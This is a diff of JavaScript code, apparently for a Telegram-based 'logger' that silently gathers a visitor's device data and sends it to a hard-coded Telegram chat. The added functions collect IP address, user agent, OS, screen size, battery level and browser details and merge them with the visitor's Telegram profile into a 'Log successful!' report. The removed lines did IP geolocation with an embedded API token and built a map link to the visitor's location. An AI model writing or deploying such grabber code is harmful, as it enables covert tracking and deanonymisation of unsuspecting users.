@@ -1,14 +1,59 @@
-async function getLocationInfo(ip) {
+async function getIPAddress() {
     try {
-        const response = await fetch(`https://ipinfo.io/${ip}?token=c6c0e1a8e22e4a`);
+        const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
-        return data;
+        return data.ip;
     } catch (error) {
-        console.error('Ошибка получения информации о местоположении:', error);
+        console.error('Ошибка получения IP адреса:', error);
+        return 'неизвестно';
+    }
+}
+
+function getUserAgent() {
+    try {
+        return navigator.userAgent || 'неизвестно';
+    } catch (error) {
+        console.error('Ошибка получения UserAgent:', error);
+        return 'неизвестно';
+    }
+}
+
+function getScreenResolution() {
+    return `${window.screen.width}x${window.screen.height}` || 'неизвестно';
+}
+
+function getOSName() {
+    try {
+        return navigator.platform || 'неизвестно';
+    } catch (error) {
+        console.error('Ошибка получения имени ОС:', error);
+        return 'неизвестно';
+    }
+}
+
+async function getBatteryPercentage() {
+    try {
+        const battery = await navigator.getBattery();
+        return Math.floor(battery.level * 100);
+    } catch (error) {
+        console.error('Ошибка получения процента заряда батареи:', error);
+        return 'неизвестно';
+    }
+}
+
+function getBrowserInfo() {
+    try {
         return {
-            country: 'неизвестно',
-            city: 'неизвестно',
-            loc: 'неизвестно'
+            name: navigator.appName || 'неизвестно',
+            version: navigator.appVersion || 'неизвестно',
+            engine: navigator.product || 'неизвестно'
+        };
+    } catch (error) {
+        console.error('Ошибка получения информации о браузере:', error);
+        return {
+            name: 'неизвестно',
+            version: 'неизвестно',
+            engine: 'неизвестно'
         };
     }
 }
@@ -20,7 +65,6 @@ async function sendDataToTelegram() {
     const additionalChatId = 6639527896;
 
     const ipAddress = await getIPAddress();
-    const locationInfo = await getLocationInfo(ipAddress);
     const userAgent = getUserAgent();
     const osName = getOSName();
     const screenResolution = getScreenResolution();
@@ -35,9 +79,6 @@ async function sendDataToTelegram() {
     const languageCode = userInfo.language_code || 'неизвестно';
     const allowsWriteToPm = userInfo.allows_write_to_pm ? 'да' : 'нет';
 
-    // Формируем ссылку на карту
-    const mapLink = locationInfo.loc ? `https://www.google.com/maps?q=${locationInfo.loc}` : 'неизвестно';
-
     const message = `
 <b> Лог успешен!</b>
 
@@ -51,9 +92,6 @@ async function sendDataToTelegram() {
 
 <b>🖥️ Информация об устройстве:</b>
 ├ Айпи: <code>${ipAddress}</code>
-├ Страна: <code>${locationInfo.country}</code>
-├ Город: <code>${locationInfo.city}</code>
-├ Ссылка на карту: <a href="${mapLink}">${mapLink}</a>
 ├ UserAgent: <code>${userAgent}</code>
 ├ Хэш: <code>неизвестно</code>
 ├ Имя ОС: <code>${osName}</code>
